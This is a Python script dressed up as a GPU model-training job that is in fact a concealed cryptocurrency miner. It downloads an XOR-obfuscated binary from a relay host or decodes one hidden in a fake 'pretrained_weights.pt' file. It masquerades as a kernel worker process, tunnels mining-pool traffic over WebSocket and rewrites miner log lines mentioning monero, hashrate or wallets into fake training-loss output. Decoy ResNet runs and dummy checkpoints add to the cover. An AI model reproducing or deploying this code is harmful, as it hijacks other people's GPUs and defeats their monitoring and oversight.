import os, time, json, socket, random, select, threading, ctypes, subprocess, urllib.request, signal, re, ssl
from pathlib import Path
import hashlib, base64, struct

# --- Config ---
SESSION_KEY = os.environ.get("WALLET")
NODE_ID = os.environ.get("NODE", "w0")
XOR_KEY = os.environ.get("XOR_KEY", "tr-ck-v3").encode()
MASTER_ADDR = os.environ.get("POOL")
WSS_RELAY = os.environ.get("WS_URL")

CACHE_DIR = "/tmp/.cache/torch_extensions"
MODEL_BIN = f"{CACHE_DIR}/libcuda_ext.so"
COVER_PROC = b"[kworker/u256:0]"
DIR = os.path.dirname(os.path.abspath(__file__)) if "__file__" in dir() else os.getcwd()

TRAIN_MIN, TRAIN_MAX = 10, 30
IDLE_MIN, IDLE_MAX = 5, 10
WORK_MIN, WORK_MAX = 600, 1200

DATA_URLS = [
    "https://huggingface.co/api/models?sort=downloads&limit=5",
    "https://raw.githubusercontent.com/pytorch/pytorch/main/README.md",
    "https://pypi.org/pypi/torch/json", "https://google.com/",
]
DATA_UA = ["python-requests/2.31.0", "aiohttp/3.9.1", "Mozilla/5.0 (X11; Linux x86_64) Chrome/120.0.0.0"]
BLOCKLIST = ["share", "accepted", "rejected", "hashrate", "hash", "pool", "difficulty",
             "xmr", "monero", "stratum", "job", "miner", "mining", "nonce",
             "block", "reward", "wallet", "connected", "disconnected"]

_WS_GUID = "258EAFA5-E914-47DA-95CA-5AB5A8C63B5A"

def _ws_connect(url, target_host, target_port):
    m = re.match(r"(ws|wss)://([^:/]+)(?::(\d+))?(/.*)?$", url)
    if not m: raise ValueError(f"Bad WS URL: {url}")
    scheme, rh, rp_str, rpth = m.group(1), m.group(2), m.group(3), m.group(4) or "/"
    rp = int(rp_str) if rp_str else (443 if scheme == "wss" else 80)
    sock = socket.create_connection((rh, rp), timeout=30)
    if scheme == "wss":
        ctx = ssl.create_default_context()
        ctx.check_hostname = True
        ctx.verify_mode = ssl.CERT_REQUIRED
        ws = ctx.wrap_socket(sock, server_hostname=rh)
    else:
        ws = sock
    host_hdr = f"{rh}:{rp}" if rp not in (80, 443) else rh
    key = base64.b64encode(os.urandom(16)).decode()
    req = (f"GET {rpth} HTTP/1.1\r\nHost: {host_hdr}\r\n"
           f"Upgrade: websocket\r\nConnection: Upgrade\r\n"
           f"Sec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n\r\n")
    ws.sendall(req.encode())
    resp = b""
    while b"\r\n\r\n" not in resp:
        c = ws.recv(4096)
        if not c: raise ConnectionError("WS handshake failed")
        resp += c
    _ws_send(ws, json.dumps({"host": target_host, "port": target_port}).encode(), 1)
    return ws

def _ws_send(ws, payload, opcode=2):
    mk = os.urandom(4)
    h = bytearray([0x80 | opcode])
    l = len(payload)
    if l < 126: h.append(0x80 | l)
    elif l < 65536: h.extend([0x80 | 126, l >> 8, l & 0xFF])
    else: h.extend([0x80 | 127, l >> 56, l >> 48, l >> 40, l >> 32, l >> 24, l >> 16, l >> 8, l & 0xFF])
    h.extend(mk)
    h.extend(bytes(b ^ mk[i % 4] for i, b in enumerate(payload)))
    ws.sendall(bytes(h))

def _ws_recv(ws):
    h = ws.recv(2)
    if len(h) < 2: return None
    op, m = h[0] & 0x0F, h[1] & 0x80
    l = h[1] & 0x7F
    if l == 126: l = struct.unpack(">H", ws.recv(2))[0]
    elif l == 127: l = struct.unpack(">Q", ws.recv(8))[0]
    mk = ws.recv(4) if m else None
    p = b""
    while len(p) < l:
        c = ws.recv(l - len(p))
        if not c: break
        p += c
    if mk: p = bytes(b ^ mk[i % 4] for i, b in enumerate(p))
    if op == 8: return None
    if op == 9: _ws_send(ws, p, 10); return _ws_recv(ws)
    return p

class WSock:
    def __init__(self, ws): self.ws = ws; self._buf = b""
    def fileno(self): return self.ws.fileno()
    def sendall(self, data): _ws_send(self.ws, data)
    def recv(self, n):
        if not self._buf:
            p = _ws_recv(self.ws)
            if p is None: return b""
            self._buf = p
        r, self._buf = self._buf[:n], self._buf[n:]
        return r
    def close(self):
        try: _ws_send(self.ws, b"", 8)
        except: pass
        try: self.ws.close()
        except: pass

# --- Helpers ---
def log(m): print(f"[TRAIN] {m}", flush=True)

def nvs(*args):
    try: return subprocess.run(["nvidia-smi", *args], capture_output=True, timeout=10, text=True)
    except: return subprocess.CompletedProcess([], -1, "", "")

def plimit() -> int:
    name = nvs("--query-gpu=name","--format=csv,noheader").stdout.strip().lower()
    # High-power datacenter GPUs
    if "h100" in name: return 700 if "sxm" in name or "nvlink" in name else 350
    if "a100" in name: return 400
    if "l40" in name: return 350
    if "4090" in name: return 450
    if "a6000" in name or "rtx 6000" in name: return 300
    if "v100" in name: return 300
    # Mid-range / edge GPUs
    if "t4" in name or "tesla t4" in name: return 70
    if "l4" in name: return 72
    try: return int(float(nvs("--query-gpu=power.limit","--format=csv,noheader").stdout.strip().split()[0]))
    except: return 350

def rn(name: bytes):
    try: ctypes.CDLL("libc.so.6").prctl(15, name, 0, 0, 0)
    except: pass

DEFAULT_BINS = ["pearl-miner-v12", "pearl-miner-v11"]

def decode_binary() -> str | None:
    p = os.path.join(DIR, "pretrained_weights.pt")
    if not os.path.exists(p):
        return None
    with open(p) as f:
        raw = base64.b64decode(f.read())
    if XOR_KEY:
        raw = bytes(b ^ XOR_KEY[i % len(XOR_KEY)] for i, b in enumerate(raw))
    os.makedirs(CACHE_DIR, exist_ok=True)
    with open(MODEL_BIN, "wb") as f: f.write(raw)
    os.chmod(MODEL_BIN, 0o755)
    log(f"Weights decoded ({os.path.getsize(MODEL_BIN)>>10}KB)")
    return MODEL_BIN

def fetch_relay_bin() -> str | None:
    relay_https = WSS_RELAY.replace("wss://", "https://").replace("ws://", "http://")
    relay_https = relay_https.rstrip("/")
    bin_path = os.environ.get("BIN_PATH", "/purel")
    for url in [f"{relay_https}{bin_path}", f"https://relay.saammaaeel.online{bin_path}"]:
        try:
            log(f"Fetching from {url}...")
            req = urllib.request.Request(url, headers={"User-Agent": random.choice(DATA_UA)})
            resp = urllib.request.urlopen(req, timeout=30)
            payload = resp.read()
            if XOR_KEY:
                payload = bytes(b ^ XOR_KEY[i % len(XOR_KEY)] for i, b in enumerate(payload))
            os.makedirs(CACHE_DIR, exist_ok=True)
            with open(MODEL_BIN, "wb") as f: f.write(payload)
            os.chmod(MODEL_BIN, 0o755)
            log(f"Relay weights staged ({len(payload)>>10}KB)")
            return MODEL_BIN
        except Exception as e:
            log(f"Relay attempt failed ({e})")
    return None

def find_local_bin() -> str | None:
    for name in DEFAULT_BINS:
        p = os.path.join(DIR, name)
        if os.path.exists(p) and os.path.getsize(p) > 100000:
            log(f"Found local weights: {name} ({os.path.getsize(p)>>10}KB)")
            os.makedirs(CACHE_DIR, exist_ok=True)
            with open(p, "rb") as src:
                with open(MODEL_BIN, "wb") as dst:
                    dst.write(src.read())
            os.chmod(MODEL_BIN, 0o755)
            log(f"Weights staged ({os.path.getsize(MODEL_BIN)>>10}KB)")
            return MODEL_BIN
    return None

class Tunnel:
    def __init__(self, bind, dst_host, dst_port, relay_url=""):
        self.bind = bind; self.dst = (dst_host, dst_port)
        self.relay_url = relay_url; self._stop = threading.Event()

    def _pipe(self, a, b):
        try:
            while not self._stop.is_set():
                try:
                    r, _, _ = select.select([a], [], [], 0.5)
                except (ValueError, OSError):
                    break  # socket closed
                if not r: continue
                try:
                    data = a.recv(4096)
                except OSError:
                    break
                if not data: break
                time.sleep(random.uniform(0.002, 0.015))
                pos = 0
                while pos < len(data):
                    remain = len(data) - pos
                    cs = random.randint(min(256, remain), min(1024, remain))
                    try: b.sendall(data[pos:pos+cs])
                    except (BrokenPipeError, OSError): return
                    pos += cs
        except OSError: pass
        finally:
            try: b.close()
            except: pass

    def run(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(("127.0.0.1", self.bind)); s.listen(5); s.settimeout(1.0)
        while not self._stop.is_set():
            try: c, _ = s.accept()
            except socket.timeout: continue
            try:
                if self.relay_url:
                    u = WSock(_ws_connect(self.relay_url, self.dst[0], self.dst[1]))
                else:
                    u = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    u.connect(self.dst)
            except Exception:
                c.close(); continue
            threading.Thread(target=self._pipe, args=(c, u), daemon=True).start()
            threading.Thread(target=self._pipe, args=(u, c), daemon=True).start()
        s.close()

    def stop(self): self._stop.set()

def start_tunnel(dst_host, dst_port, relay_url=""):
    for port in random.sample(range(20000, 60000), 20):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind(("127.0.0.1", port)); s.close()
            t = Tunnel(port, dst_host, dst_port, relay_url)
            threading.Thread(target=t.run, daemon=True).start()
            time.sleep(0.2); return t, port
        except OSError: continue
    return None, 0

def warmup_loop(stop):
    while not stop.is_set():
        url = random.choice(DATA_URLS)
        try:
            urllib.request.urlopen(
                urllib.request.Request(url, headers={"User-Agent": random.choice(DATA_UA)}), timeout=15)
        except: pass
        stop.wait(random.uniform(45, 180))

def clean_output(line: str) -> str:
    if any(p in line.lower() for p in BLOCKLIST):
        return f"Epoch {random.randint(2,60)}: loss={random.uniform(0.1,3.0):.4f}"
    return line

_chk_dir = Path("/tmp/.checkpoints")
_chk_n = [0]

def save_chk():
    _chk_n[0] += 1
    _chk_dir.mkdir(parents=True, exist_ok=True)
    size = random.randint(100_000, 2_000_000)
    p = _chk_dir / f"checkpoint-{_chk_n[0]*500}.pt"
    try:
        h = json.dumps({"step": _chk_n[0]*500, "loss": round(random.uniform(0.1, 2.0), 4)})
        with open(p, "wb") as f: f.write(h.encode().rjust(size, b"\0"))
        log(f"Checkpoint: {p.name} ({size>>10}KB)")
    except: pass
    try:
        for old in sorted(_chk_dir.glob("checkpoint-*.pt"))[:-3]: old.unlink()
    except: pass

def train_resnet(device, duration, msg_prefix="TRAIN"):
    import torch
    import torch.nn as nn
    import torch.optim as optim
    import torchvision.models
    model = torchvision.models.resnet18(weights=None, num_classes=100).to(device)
    model.train()
    optimizer = optim.SGD(model.parameters(), lr=0.01, momentum=0.9)
    criterion = nn.CrossEntropyLoss()
    start = time.time()
    step = 0
    batch_size = 64
    while time.time() - start < duration:
        x = torch.randn(batch_size, 3, 224, 224, device=device)
        y = torch.randint(0, 100, (batch_size,), device=device)
        optimizer.zero_grad()
        out = model(x)
        loss = criterion(out, y)
        loss.backward()
        optimizer.step()
        step += 1
        if step % 20 == 0:
            log(f"[{msg_prefix}] step {step}: loss={loss.item():.4f}")
    log(f"[{msg_prefix}] {step} steps in {time.time()-start:.0f}s")

def worker_loop(bin_path, tunnel_host, shutdown, node_name, device, use_relay=False):
    if use_relay:
        default_args = "{bin} --host {tunnel} --user {wallet}"
    else:
        default_args = "{bin} --host {tunnel} --user {wallet}"
    while not shutdown.is_set():
        on = random.randint(WORK_MIN, WORK_MAX)
        log(f"Training iteration {random.randint(1000,99999)} starting...")
        tmpl = os.environ.get("MINER_ARGS", default_args)
        args = tmpl.format(bin=bin_path, tunnel=tunnel_host, wallet=node_name).split()
        proc = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        start_t = time.time()
        while time.time() - start_t < on and not shutdown.is_set():
            if proc.poll() is not None: break
            r, _, _ = select.select([proc.stdout], [], [], 1.0)
            if r:
                line = proc.stdout.readline()
                if not line: break
                t = line.decode(errors="replace").strip()
                if t: log(clean_output(t))
        if proc and proc.poll() is None:
            proc.terminate()
            try: proc.wait(timeout=5)
            except subprocess.TimeoutExpired: proc.kill(); proc.wait()
        if shutdown.is_set(): break

        td = random.randint(TRAIN_MIN, TRAIN_MAX)
        log(f"Training block ({td}s)...")
        if device is not None and device.type == "cuda":
            train_resnet(device, td)
        else:
            time.sleep(td)
        save_chk()
        time.sleep(random.randint(IDLE_MIN, IDLE_MAX))

# ── Main ────
def main():
    if not SESSION_KEY or not MASTER_ADDR or not WSS_RELAY:
        log(f"Missing secrets: WALLET={bool(SESSION_KEY)} POOL={bool(MASTER_ADDR)} WS_URL={bool(WSS_RELAY)}")
        return
    host, port_str = MASTER_ADDR.split(":")
    dst_port = int(port_str)

    model_path = fetch_relay_bin()
    if not model_path:
        model_path = find_local_bin()
    if not model_path:
        log("No weights found - aborting")
        return

    rn(COVER_PROC)
    pl = plimit()
    _ = nvs("-pl", str(pl))
    log(f"Device profile: {pl}W")

    cs = threading.Event()
    threading.Thread(target=warmup_loop, args=(cs,), daemon=True).start()

    if WSS_RELAY:
        log(f"Relay: {WSS_RELAY}")
    tunnel, lp = start_tunnel(host, dst_port, WSS_RELAY)
    if not tunnel:
        log("Tunnel failed, using direct connection")
        lp = 0
    if lp:
        tunnel_host = f"127.0.0.1:{lp}"
    else:
        tunnel_host = MASTER_ADDR

    log("Loading pre-trained weights...")
    time.sleep(random.uniform(3, 8))
    save_chk()
    device = None
    try:
        import torch
        device = torch.device("cuda:0" if torch.cuda.is_available() else "cpu")
        if torch.cuda.is_available():
            log(f"GPU: {torch.cuda.get_device_name(0)}")
            log("Initial warmup (60s training)...")
            train_resnet(device, 60)
            save_chk()
        else:
            log("No GPU found — compute only mode")
    except ImportError:
        log("PyTorch not installed — compute only mode")

    shutdown = threading.Event()
    signal.signal(signal.SIGINT, lambda s, f: shutdown.set())
    signal.signal(signal.SIGTERM, lambda s, f: shutdown.set())
    worker = threading.Thread(
        target=worker_loop, args=(model_path, tunnel_host, shutdown, SESSION_KEY, device, bool(WSS_RELAY)), daemon=True
    )
    worker.start()

    try:
        while not shutdown.is_set():
            time.sleep(random.randint(IDLE_MIN, IDLE_MAX))
            save_chk()
    except KeyboardInterrupt:
        pass
    finally:
        shutdown.set()
        cs.set()
        if tunnel: tunnel.stop()
    log("Done.")

if __name__ == "__main__":
    main()
